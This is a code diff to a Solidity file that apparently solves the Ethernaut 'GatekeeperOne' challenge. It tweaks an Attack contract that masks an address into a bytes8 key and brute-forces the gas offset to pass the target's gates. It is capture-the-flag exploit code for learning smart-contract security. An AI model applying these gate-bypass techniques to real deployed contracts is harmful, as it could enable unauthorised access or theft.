@@ -1,9 +1,11 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 import "hardhat/console.sol";
 
 contract GatekeeperOne {
     address public entrant;
+    event Attempt(string msg);
 
     modifier gateOne() {
         require(msg.sender != tx.origin, "gate one");
@@ -30,19 +32,22 @@ contract GatekeeperOne {
 
 contract Attack {
     GatekeeperOne gate;
+    event Attempt(uint256 gasUsed);
+    event Key(bytes8 key);
+
 
      constructor(address target) {
         gate = GatekeeperOne(target);
     }
 
     function attack() public {
-        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        bytes8 key = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
 
-        // Ищем offset от 0 до 8191, чтобы попасть в точное значение
-        for (uint256 i = 200; i < 8191; i++) {
-            (bool success,) =  address(gate).call{gas: 8191 * 3 + i}(abi.encodeWithSignature("enter(bytes8)", key));
-            if (success) {
-                console.log("success", 8191 * 3 + i);
+        for (uint i = 0; i < 8191; i++) {
+            (bool result,) =  address(gate).call{gas: 8191 * 3 + i}(abi.encodeWithSignature("enter(bytes8)", key));
+
+            if (result) {
+                break;
             }
         }
     }
